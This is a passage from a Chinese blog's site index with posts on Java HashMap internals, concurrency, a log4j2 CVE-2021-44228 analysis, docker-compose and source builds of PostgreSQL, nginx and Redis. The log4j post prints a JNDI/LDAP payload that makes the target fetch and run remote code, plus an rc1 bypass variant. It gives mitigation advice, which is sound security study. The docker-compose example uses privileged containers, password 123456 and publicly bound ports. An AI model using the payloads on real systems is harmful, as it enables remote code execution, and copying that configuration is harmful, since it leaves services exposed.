Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n, hash; K k; // table不为空 并且 table的大小大于0 并且 table的大小-1 逻辑与 key的hash() 不为空 if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; (hash = hash(key))]) != null) &#123; // 如果hash相同 并且（两个key地址相等或者equals）直接返回这个Node if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; // 如果当前Node的next节点不为空 if ((e = first.next) != null) &#123; // 如果当前节点是树节点，直接在通过红黑树的方法获取 if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); // 反之则是链表，通过next节点一直往下寻找 do &#123; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; &#125; while ((e = e.next) != null); &#125; &#125; return null; &#125; resize方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586final Node&lt;K,V&gt;[] resize() &#123; Node&lt;K,V&gt;[] oldTab = table; // 旧数组容量 int oldCap = (oldTab == null) ? 0 : oldTab.length; // 旧扩容阈值 int oldThr = threshold; // 新的数组容量和扩容阈值 int newCap, newThr = 0; // 旧数组容量&gt;0 if (oldCap &gt; 0) &#123; // 旧数组容量&gt;=最大容量（1&lt;&lt;30） if (oldCap &gt;= MAXIMUM_CAPACITY) &#123; // 设置扩容阈值为最大的int threshold = Integer.MAX_VALUE; // 扩不了容了，直接返回旧table return oldTab; &#125; // 新数组容量扩容一倍 // 如果旧数组容量的两倍&lt;最大容量（1&lt;&lt;30）并且旧容量&gt;=默认的初始化容量（16）， else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY) // 新扩容阈值 扩容一倍 newThr = oldThr &lt;&lt; 1; // double threshold &#125; else if (oldThr &gt; 0) // initial capacity was placed in threshold newCap = oldThr; else &#123;// // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY; // 默认16 newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); // 默认16*0.75=12 &#125; if (newThr == 0) &#123; // 新扩容阈值为0的时候初始化 float ft = (float)newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ? (int)ft : Integer.MAX_VALUE); &#125; threshold = newThr; @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap]; table = newTab; if (oldTab != null) &#123; for (int j = 0; j &lt; oldCap; ++j) &#123; Node&lt;K,V&gt; e; if ((e = oldTab[j]) != null) &#123; oldTab[j] = null; if (e.next == null) newTab[e.hash &amp; (newCap - 1)] = e; else if (e instanceof TreeNode) // 是树节点 调用红黑树的方法 ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap); else &#123; // preserve order // 链表节点的话 会将一个链表 分成两个链表，一个挂index，一个挂index+oldCap Node&lt;K,V&gt; loHead = null, loTail = null; Node&lt;K,V&gt; hiHead = null, hiTail = null; Node&lt;K,V&gt; next; do &#123; next = e.next; if ((e.hash &amp; oldCap) == 0) &#123; if (loTail == null) loHead = e; else loTail.next = e; loTail = e; &#125; else &#123; if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; &#125; &#125; while ((e = next) != null); if (loTail != null) &#123; loTail.next = null; newTab[j] = loHead; &#125; if (hiTail != null) &#123; hiTail.next = null; newTab[j + oldCap] = hiHead; &#125; &#125; &#125; &#125; &#125; return newTab;&#125; 链表转树和树转链表当链表长度&gt;8的时候 链表会转树，当树长度&lt;6的时候会转链表，那么为什么不设置成一个数呢 比如7？是为了避免转换的太频繁。 hash计算先获取key的hashCode(); 将key的hashCode高16位与自身进行异或操作，得到的值即为hash值 为什么要这么做？ 是为了扰动的均衡一点。 jdk1.7 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; // 先取key的hashCode再和hashSeed进行异或运算 h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4); &#125; jdk1.8 12345static final int hash(Object key) &#123; int h; // key的hashCode的高16位和低16位进行异或操作的值 return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 为什么从jdk1.7到1.8扰动次数变少？ 我觉得可能是扰动2次效果差不了多少并且操作次数还变少了。 为什么hashMap的扩容一直是2的倍数？这个就要从如何在table里面的定位说起了，首先获取到key的hash，然后将(hash &amp; n-1)来定位到在table的位置，那么为什么要&amp;上n-1呢，我们都知道n是数组的长度，当n为2的倍数时候， 比如n=16，n-1的二进制就是1111，和hash进行逻辑与操作的时候，最后二进制的后四位决定了在table的位置。 当扩容一倍 也就是n=32的时候，n-1的二进制就是11111，和hash进行逻辑与操作的时候，最后二进制的后五位决定了在table的位置。 这就会造成一个现象，举个例子，比如说之前在2这个位置上的Node节点，原先是不管第五位二进制的，现在要管的话要么是0要么 是1，是0的话那么他的位置不变还是在2这个位置上，是1的话说明他在2+16=18的位置上。 这样在进行扩容操作的时候不需要像hashTable一样一个一个进行操作，只要对一个table节点里面的链表或者红黑树进行操作，要么还在当前位置，要么在当前+oldCap的位置。 hashMap是如何解决hash冲突的？hashMap是通过链地址法的方式解决hash冲突的，具体就是通过数组+链表（或红黑树）的方式。 解决hash冲突的几种办法：开发定址法、再hash法、链地址法、建立公共溢出区等。 参考文献： ​ https://tech.meituan.com/2016/06/24/java-hashmap.html HashTable遗留类，数组+链表(头插法)，使用synchronized确保线程安全，同时与ConcurrentHashMap相比性能低，扩容rehash过程是先生成一个新的entry数组，然后将旧的数据一个一个放进来。 ConcurrentHashMapLinkedHashMapWeakHashMapTreeMapEnumMap","categories":[{"name":"Java","slug":"Java","permalink":"http://fireflyingup.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://fireflyingup.github.io/tags/Java/"}]},{"title":"Java并发","slug":"Java并发","date":"2022-04-21T02:40:20.000Z","updated":"2024-03-11T01:20:28.617Z","comments":true,"path":"2022/04/21/Java并发/","link":"","permalink":"http://fireflyingup.github.io/2022/04/21/Java%E5%B9%B6%E5%8F%91/","excerpt":"","text":"Java并发锁死锁死锁是指两个或两个以上的进程（线程）在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程（线程）称为死锁进程（线程）。 死锁产生的四个条件： 互斥条件：线程(进程)对于所分配到的资源具有排它性，即一个资源只能被一个线程(进程)占用，直到被该线程(进程)释放 请求与保持条件：一个线程(进程)因请求被占用资源而发生阻塞时，对已获得的资源保持不放。 不剥夺条件：线程(进程)已获得的资源在末使用完之前不能被其他线程强行剥夺，只有自己使用完毕后才释放资源。 循环等待条件：当发生死锁时，所等待的线程(进程)必定会形成一个环路（类似于死循环），造成永久阻塞 如何解决： 破坏请求与保持条件：一次性申请所有的资源。 破坏不剥夺条件：占用部分资源的线程进一步申请其他资源时，如果申请不到，可以主动释放它占有的资源。 破坏循环等待条件：按序申请资源，反序释放资源。 活锁活锁指的是 任务或者执行者没有被阻塞，由于某些条件没有满足，导致一直重复尝试，失败，尝试，失败。 活锁和死锁的区别在于，处于活锁的实体是在不断的改变状态，所谓的“活”， 而处于死锁的实体表现为等待；活锁有可能自行解开，死锁则不能。 锁饥饿饥饿：是指如果线程T1占用了资源R，线程T2又请求封锁R，于是T2等待。T3也请求资源R，当T1释放了R上的封锁后，系统首先批准了T3的请求，T2仍然等待。然后T4又请求封锁R，当T3释放了R上的封锁之后，系统又批准了T4的请求…，T2可能永远等待。","categories":[{"name":"Java","slug":"Java","permalink":"http://fireflyingup.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://fireflyingup.github.io/tags/Java/"}]},{"title":"log4j2(CVE-2021-44228)漏洞分析","slug":"log4j2-CVE-2021-44228-漏洞分析","date":"2021-12-12T11:23:30.000Z","updated":"2023-12-19T02:11:45.397Z","comments":true,"path":"2021/12/12/log4j2-CVE-2021-44228-漏洞分析/","link":"","permalink":"http://fireflyingup.github.io/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"介绍log4j 2是apache官方出品的日志框架，是对log4j的一个升级，目前在很多厂商的java项目中被广泛使用，影响力广泛，在2021年11月24日被阿里云团队发现。 漏洞编号：CVE-2021-44228 危害等级：严重 CVSS评分：10 影响版本：Apache Log4j 2.x &lt; 2.15.0 复现poc如下： 1234public static void main(String[] args) throws Exception &#123; System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;); logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;&quot;);&#125; 成功利用截图： 代码分析首先从logger.error()方法进去进入第一个关键点logIfEnabled方法，在当前方法的做了一个isEnabled判断，主要是将当前的日志打印级别（logger.error()就是error）和配置的默认级别比较，这也就是为什么logger.info不会触发，而logger.error()会。 然后沿着logMessage方法往下看，中间很多就跳过了，发现他会进入一个PatternLayout的方法，这个方法有很多个PatternFormatter对打印的日志进行格式处理，其中有个PatternFormatter里面有个converter对象的实现为MessagePatternConverter，这个也就是导致漏洞发生的类，在后面的log4j-2.15.0-rc1版本也就是对当前类做了修改。 然后来到MessagePatternConverter这个类的format方法。 可以看到上图红色方框里面的代码，当判断你打印的格式为 ${ 开头就进入replace的这个方法来进行替换，依次进入replace方法-&gt;substitute-&gt;substitute，发现有个resolveVariable的方法处理了变量。 进入resolveVariable方法，发现最后执行了resolver.lookup()的方法，resolver的实现是Interpolator这个类。 进入Interpolator，他通过对poc里面jndi:ldap://127.0.0.1:1389/Exploit获取第一个冒号之前的作为key来map中获取对应的LookUp，可以看到map中又这么多类型的LookUp，这里利用的是jndi的JndiLookUp这个类。 JndiLookUp中又有个JndiManager，又调用了JndiManager的lookUp方法 然后他会调用到LdapCtx的c_lookup方法获取到一个LdapResult对象。 然后调用DirectoryManager.getObjectInstance，这var3是个Reference类型。 在进入就是getObjectFactoryFromReference方法，这里面有class.forName()，然后就加载了类，同时也执行了命令。 最终的地方 整体下来有个疑惑的点，就是不知他通过ldap调过来的class文件放哪了，还需要深入学习，有师傅知道的话，感谢能够告知。 至此2.x到2.14.1版本的log4j漏洞复现完毕，接下来看log4j的log4j-2.15.0-rc1版本的绕过。 我开始clone log4j的源代码，并切换到log4j-2.15.0-rc1版本，发现大体上有两处的改动，第一处是前面有说过的MessagePatternConverter这个实现类，apache官方将这个类添加了四个内部实现类，并且将format这个方法在子类里面进行了实现，如下图所示。 format方法如下 会发现四个实现类里面有个LookupMessagePatternConverter的类就是利用点，如下图所示。 但是发现根本到不了这个LookupMessagePatternConverter类，默认去的是SimpleMessagePatternConverter。 我们想要的是进入LookupMessagePatternConverter这个类，所以我看了一下这个formatters的数据由来，发现他通过分析日志的pattern格式（如：%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n ）来选择PatternConverter，比如发现有%d{HH:mm:ss.SSS}就会通过反射来创建一个DatePatternConverter类，所以我这里就想要通过配置文件来让反射出我想要的类，于是配置的xml文件如下，主要添加的就是%msg后面的{lookups}这个。 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;!-- 具体就是%msg后面的&#123;lookups&#125;这个会使后续的代码反射出LookupMessagePatternConverter --&gt; &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg&#123;lookups&#125;%n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;error&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 具体的解析代码如下，有兴趣可以自己去阅读一下源码： 满足如下条件既生成想要的类，也就是lookups这个为true，也就是loadLookups(options)这个方法里面当传入的options里面含有lookups字符串的时候返回true。 生成LookupMessagePatternConverter最终的调用链如下： 到此我们又成功用到了这个针对${}的解析，但是在进入JndiManager这个类的lookup里面发现前面加了很多东西，最终poc在下面红色框框的里面由于attributeMap中存在javaFactory这个key，导致直接return null，失败。 然后我看了一下log4j-2.15.0-rc2的修改，发现了一个点，他在代码提交中添加了如下代码，那就反向思维一下，log4j-2.15.0-rc1里面没有返回null，那我们只要让上面的new URI()这个方法爆出URISyntaxException这个异常并且不影响后面的使用就行，异常被捕获但是并未处理导致了这个绕过。 于是在原来的payload上面添加特殊字符绕过，poc如下logger.error(“${jndi:ldap://127.0.0.1:1389/Exploit/ }”); 到此结束，具体的利用过程就不发出来了，目前官方已经发布了2.15.0版本，大家及时更新。 全部调用链如下： poc测试代码地址：https://github.com/fireflyingup/log4j-poc安全建议1、排查应用是否引入了Apache log4j-core Jar包，若存在依赖引入，且在受影响版本范围内，则可能存在漏洞影响。请尽快升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0 版本，地址 https://logging.apache.org/log4j/2.x/download.html 2、升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink 3、临时缓解方案。可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。对于大于2.10版本的Log4j，可设置 log4j2.formatMsgNoLookups 为 True，或者将 JndiLookup 类从 classpath 中去除，例如 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 希望大家守好安全不要做坏事。 参考链接https://xz.aliyun.com/t/10649#toc-3 https://help.aliyun.com/noticelist/articleid/1060971232.html https://logging.apache.org/log4j/2.x/ https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://fireflyingup.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://fireflyingup.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}]},{"title":"记一次docker-compose的使用","slug":"记一次docker-compose的使用","date":"2021-10-28T16:41:19.000Z","updated":"2023-12-19T01:34:06.376Z","comments":true,"path":"2021/10/29/记一次docker-compose的使用/","link":"","permalink":"http://fireflyingup.github.io/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1docker-compose%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"什么是docker-compose?英文解释： Docker Compose is a tool for running multi-container applications on Docker defined using the Compose file format. A Compose file is used to define how the one or more containers that make up your application are configured. Once you have a Compose file, you can create and start your application with a single command: docker compose up. 也就是说docker-compose是一个工具，通过一个定义的compose文件格式来运行docker上的多容器应用程序，Compose 文件用于定义构成应用程序的一个或多个容器的配置方式，可以通过docker-compose up来启动docker应用程序，所以说docker-compose是一个很好的docker管理docker的东西，下面讲一次docker-compose的一次使用。 项目分析这里将要搭建一个常用的项目架构，使用的环境如下 nginx:1.18.0 jdk:1.8 postgresql:10.4 redis:5.0.13 这是一个最基础的项目情况，首先流量进入nginx，nginx做反向代理把流量转发给我们的项目（这里取名叫做fire），然后fire可以访问pgsql和redis。 环境准备安装docker，命令如下通过yum安装docker 1yum install docker 使用service服务运行docker 1systemctl start docker 判断docker是否启动成功 1234567docker -v# 出现下面信息 # Docker version 1.13.1, build 7d71120/1.13.1# 或者docker ps # 出现# CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 安装docker-compose工具去docker-compose的github上下载对应的tag，这里我们选择v2.0.1 点进去选择自己对应的服务器或者电脑版本下载，这里我是linux-x86_64的。 下载完之后会发现下下来的直接就可以使用，我们修改一下名字，并放入/usr/bin/目录下，这样就可以直接使用命令了。 123mv docker-compose-linux-x86_64 docker-compose # 修改名字，这里下下来的是直接可以用的，已经编译好了mv docker-compose /usr/bin/ # 将docker-compose移到/usr/bin目录下docker-compose -v # 测试一下，出现Docker Compose version v2.0.1即为成功 docker-compose.yml文件编写文件如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758version: &#x27;3&#x27; #版本services: redis: image: docker.io/redis:5.0.13 # 镜像名称，不知道可以docker search redis搜索一下，然后填入版本号可以去官方仓库查看，地址：https://hub.docker.com/search?q=java&amp;type=image privileged: true # 这里很重要，因为我项目是部署在非root用户下面，所以在我运行的时候一直报权限不足，加了这个就好了 container_name: redis # 容器名称 restart: always # 每次重启自动启动 environment: - TZ=Asia/Shanghai # 使用上海时区 volumes: - $&#123;HOME&#125;/data/redis:/data # 挂载映射，冒号前面的是你服务器的路径，后面的是docker容器里面的路径，两边做了一个映射 ports: - 0.0.0.0:6379:6379 # 端口映射，将本机的6379端口和docker容器的6379端口做了映射，0.0.0.0表示端口对外开放，服务器外可以访问。 command: redis-server --requirepass 123456 # 执行的命令，--requirepass 设置密码为123456 postgres: image: docker.io/postgres:10.4 privileged: true container_name: postgres restart: always environment: - TZ=Asia/Shanghai - POSTGRES_DB=sca # 设置pgsql的数据库名称 - POSTGRES_USER=sca # 设置pgsql的用户名，他有一个默认用户postgres - POSTGRES_PASSWORD=sca # 设置pgsql的密码 ports: - 0.0.0.0:5432:5432 volumes: - $&#123;HOME&#125;/data/postgresql:/var/lib/postgresql/data nginx: image: docker.io/nginx:1.18.0 privileged: true volumes: - $&#123;HOME&#125;/config/nginx/conf/nginx.conf:/etc/nginx/nginx.conf - $&#123;HOME&#125;/app/html:/usr/share/nginx/html # 前端的静态文件存放在服务器的$&#123;HOME&#125;/app/html下，会自动映射进docker里面的/usr/share/nginx/html ports: - 0.0.0.0:80:80 container_name: nginx links: - fire depends_on: - fire # 表示依赖于fire这个项目 fire: image: openjdk:8-jdk-alpine container_name: fire privileged: true ports: - 0.0.0.0:8081:8081 environment: - TZ=Asia/Shanghai volumes: - $&#123;HOME&#125;/app/fire-service.jar:/app/fire-service.jar command: java -jar -Dspring.profiles.active=dev /app/fire-service.jar # -Dspring.profiles.active=dev指定dev环境运行 links: - postgres - redis depends_on: - postgres - redis # 表示依赖于postgresql和redis 这里有几个地方要说一下 第一个是privileged: true，这里是由于我是非root用户使用docker-compose的，所以他在docker容器里面使用路径的话会出现权限不够的情况，使用这个就解决了这个问题，但是有一个其他的问题就是在服务器映射创建出来的文件变成了root权限，这个还有待优化去解决。 第二个是我后面出现了一个问题，问题如下 1fire | Error: Invalid or corrupt jarfile /app/fire-service.jar 这个问题出现有很多种情况，比如你映射的docker容器里面的路径和你启动命令的路径不对，也就是volumns冒号后面的路径和你command里面java -jar启动的路径不对。 在这里我是一种特殊的情况，是因为我使用的是非root用户，而且我的volumes里面使用了${HOME}，所以外面被映射到了/root目录下，而不是我的/home/myName目录下，排查这个问题的心理路程如下。 首先我猜想是不是我的docker-compose.yml文件有没有错误，在我仔细万分的肉眼识别之下，我确定是没有问题的，那么排查我文件的错误。 然后我在确定我docker-compose.yml文件下的映射没问题的情况下，我想查看我容器里面的包是否正确，但是容器无法启动，我无法通过 docker exec -it 容器名 bash 命令进入我的容器，所以我得想办法进入我的容器或者输出我这个容器的映射文件，于是我构造了以下command。 1command: ls -l /app &amp; java -jar -Dspring.profiles.active=dev /app/fire-service.jar # 主要目的是打印出fire-service.jar文件的大小，看看是不是文件损坏或者其他原因 结果发现了如下打印 12fire | total 0fire | drwxr-xr-x 2 root root 6 Oct 28 22:06 fire-service.jar 看见这个文件的大小只有6B，明显不对，我在仔细看我的docker-compose文件，发现了问题点，原来我是root用户启动的docker-compose up命令，导致${HOME}取了/root的值，后来su myName切换到普通用户，就成功了 最终docker ps发现项目全部启动 最后说一下docker-compose的常用命令 123docker-compose up # 启动docker-compose up -d # 后台启动docker-compose down # 关闭","categories":[{"name":"docker","slug":"docker","permalink":"http://fireflyingup.github.io/categories/docker/"}],"tags":[{"name":"docker-compose","slug":"docker-compose","permalink":"http://fireflyingup.github.io/tags/docker-compose/"}]},{"title":"Linux源码编译安装PostgreSql","slug":"Linux源码编译安装PostgreSql","date":"2021-09-23T16:44:28.000Z","updated":"2023-12-19T01:39:25.170Z","comments":true,"path":"2021/09/24/Linux源码编译安装PostgreSql/","link":"","permalink":"http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/","excerpt":"","text":"1、下载postgresql百度或者谷歌搜索postgresql download 点进去就是postgresql的官方下载页面，页面如下 如果你知道你自己的系统是什么，那么你就去上面蓝色框中选择自己系统对应的来进行下载，当然不知道的话，比如说你是arm的系统，这时候就要在自己的系统上使用源码编译，不然是无法使用的，这里就是要进行源码编译，所以我们选择Source code下面的file browser，也就是上图中的红色框。 点进去可以看到有很多postgresql的版本，这里我们选择10.4版本进行安装。 点击v10.4进去下载对应的压缩文件 当然也可以使用wget命令 12wget https://ftp.postgresql.org/pub/source/v10.4/postgresql-10.4.tar.gz #下载tar -zxvf postgresql-10.4.tar.gz #解压 2、编译安装postgresql在编译之前我们要先对编译所需要的环境进行安装 安装readline 123yum install readline-devel #yum安装# 或者sudo apt-get install libreadline6-dev 不安装可能会出现如下错误 安装zlib 1yum install zlib-devel 进入解压好的文件夹里面执行编译命令 123cd postgresql-10.4./configure --prefix=/root/target/postgre #指定编译目标文件夹make &amp;&amp; make install 3、安装完成1234[root@QLL3-5 postgre]# lsbin include lib share[root@QLL3-5 postgre]# pwd/root/target/postgre","categories":[{"name":"安装","slug":"安装","permalink":"http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"}],"tags":[{"name":"postgresql","slug":"postgresql","permalink":"http://fireflyingup.github.io/tags/postgresql/"}]},{"title":"Linux源码编译安装Nginx","slug":"Linux源码编译安装Nginx","date":"2021-09-23T16:44:20.000Z","updated":"2023-12-19T01:39:30.236Z","comments":true,"path":"2021/09/24/Linux源码编译安装Nginx/","link":"","permalink":"http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/","excerpt":"","text":"1、nginx下载整个安装步骤可以直接采用官方的安装文档 使用wget命令下载nginx，这里以nginx 1.18.0 版本为例 12wget https://nginx.org/download/nginx-1.18.0.tar.gz #下载tar -zxvf nginx-1.18.0.tar.gz #解压 或者去nginx官网下载页面下载安装包，页面如下 2、必要模块安装下载PCRE，PCRE - Supports regular expressions. Required by the NGINX Core and Rewrite modules. 12wget https://ftp.pcre.org/pub/pcre/pcre-8.44.tar.gz #下载tar -zxvf pcre-8.44.tar.gz #解压 下载zlib, zlib - Supports header compression. Required by the NGINX Gzip module. 12wget http://zlib.net/zlib-1.2.11.tar.gz #下载tar -zxvf zlib-1.2.11.tar.gz #解压 可以看到当前文件夹下面有以下文件 接下来我们依次进行编译 编译pcre-8.44 12cd pcre-8.44./configure 发现以下报错 原因是没有gcc-c++编译环境，输入以下命令 123yum install gcc-c++#完成安装之后继续编译pcre./configure 出现如下页面表示成功 接下来执行以下命令，即pcre编译完成。 1make &amp;&amp; make install 编译zlib，执行过程和pcre一致，在这里不再重复。 123cd zlib-1.2.11./configuremake &amp;&amp; make install 3、编译安装nginx进入nginx目录，这里我选择将nginx编译后放入/root/target/nginx目录下面，这个目录你们可以自行配置，参数介绍官方的安装文档有很详细的介绍，这里我不在介绍。 12cd nginx-1.18.0./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_module 在运行上述命令的时候我发现了另一个问题，这个是没有OpenSSL的环境。 我们执行以下命令来安装OpenSSL的环境 1yum -y install openssl openssl-devel 然后在继续执行就可以了 12./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_modulemake &amp;&amp; make install 这样nginx的源码编译安装就大功告成了，附上一个nginx编译完成的截图。 再附上一个安装到目标文件夹的截图。 最后说一句，刚开始我准备使用nginx-1.9.15，可是后来在使用./configure的时候遇见了各种问题，后来就按照官方文档使用了稳定的nginx-1.18.0。 参考链接： nginx官方文档：https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources 安装OpenSSL：https://blog.csdn.net/testcs_dn/article/details/51461999","categories":[{"name":"安装","slug":"安装","permalink":"http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://fireflyingup.github.io/tags/nginx/"}]},{"title":"Linux源码编译安装Redis","slug":"Linux源码编译安装Redis","date":"2021-09-23T16:44:05.000Z","updated":"2023-12-19T01:39:20.097Z","comments":true,"path":"2021/09/24/Linux源码编译安装Redis/","link":"","permalink":"http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Redis/","excerpt":"","text":"1、下载Redisredis版本：5.0.13 123wget https://download.redis.io/releases/redis-5.0.13.tar.gz #下载redistar -zxvf redis-5.0.13.tar.gz #解压cd redis-5.0.13 2、编译可以直接使用make &amp;&amp; make install，如果想要编译到指定文件夹的话，使用以下命令，注意一定要连在一起而且不能用&amp;&amp;，不然将不会编译到指定文件夹 1make CFLAGS=&quot;-g -O0&quot; PREFIX=/root/target/redis install 如果缺少gcc-c++环境的话，使用以下命令 1yum install gcc-c++ 3、编译完成可以看到最后在指定文件夹下面出现了bin文件夹，编译完成。 12345[root@QLL3-5 bin]# pwd/root/target/redis/bin[root@QLL3-5 bin]# lsredis-benchmark redis-check-aof redis-check-rdb redis-cli redis-sentinel redis-server[root@QLL3-5 bin]#","categories":[{"name":"安装","slug":"安装","permalink":"http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://fireflyingup.github.io/tags/redis/"}]}],"categories":[{"name":"Elasticsearch","slug":"Elasticsearch","permalink":"http://fireflyingup.github.io/categories/Elasticsearch/"},{"name":"dubbo","slug":"dubbo","permalink":"http://fireflyingup.github.io/categories/dubbo/"},{"name":"cloud","slug":"cloud","permalink":"http://fireflyingup.github.io/categories/cloud/"},{"name":"mybatis","slug":"mybatis","permalink":"http://fireflyingup.github.io/categories/mybatis/"},{"name":"算法","slug":"算法","permalink":"http://fireflyingup.github.io/categories/%E7%AE%97%E6%B3%95/"},{"name":"kafka","slug":"kafka","permalink":"http://fireflyingup.github.io/categories/kafka/"},{"name":"go","slug":"go","permalink":"http://fireflyingup.github.io/categories/go/"},{"name":"eclipse plugins","slug":"eclipse-plugins","permalink":"http://fireflyingup.github.io/categories/eclipse-plugins/"},{"name":"dockerfile","slug":"dockerfile","permalink":"http://fireflyingup.github.io/categories/dockerfile/"},{"name":"Java","slug":"Java","permalink":"http://fireflyingup.github.io/categories/Java/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://fireflyingup.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"docker","slug":"docker","permalink":"http://fireflyingup.github.io/categories/docker/"},{"name":"安装","slug":"安装","permalink":"http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"}],"tags":[{"name":"Elasticsearch","slug":"Elasticsearch","permalink":"http://fireflyingup.github.io/tags/Elasticsearch/"},{"name":"dubbo","slug":"dubbo","permalink":"http://fireflyingup.github.io/tags/dubbo/"},{"name":"cloud","slug":"cloud","permalink":"http://fireflyingup.github.io/tags/cloud/"},{"name":"mybatis","slug":"mybatis","permalink":"http://fireflyingup.github.io/tags/mybatis/"},{"name":"算法","slug":"算法","permalink":"http://fireflyingup.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"kafka","slug":"kafka","permalink":"http://fireflyingup.github.io/tags/kafka/"},{"name":"go","slug":"go","permalink":"http://fireflyingup.github.io/tags/go/"},{"name":"eclipse","slug":"eclipse","permalink":"http://fireflyingup.github.io/tags/eclipse/"},{"name":"postgresql","slug":"postgresql","permalink":"http://fireflyingup.github.io/tags/postgresql/"},{"name":"nginx","slug":"nginx","permalink":"http://fireflyingup.github.io/tags/nginx/"},{"name":"redis","slug":"redis","permalink":"http://fireflyingup.github.io/tags/redis/"},{"name":"Java","slug":"Java","permalink":"http://fireflyingup.github.io/tags/Java/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://fireflyingup.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"docker-compose","slug":"docker-compose","permalink":"http://fireflyingup.github.io/tags/docker-compose/"}]}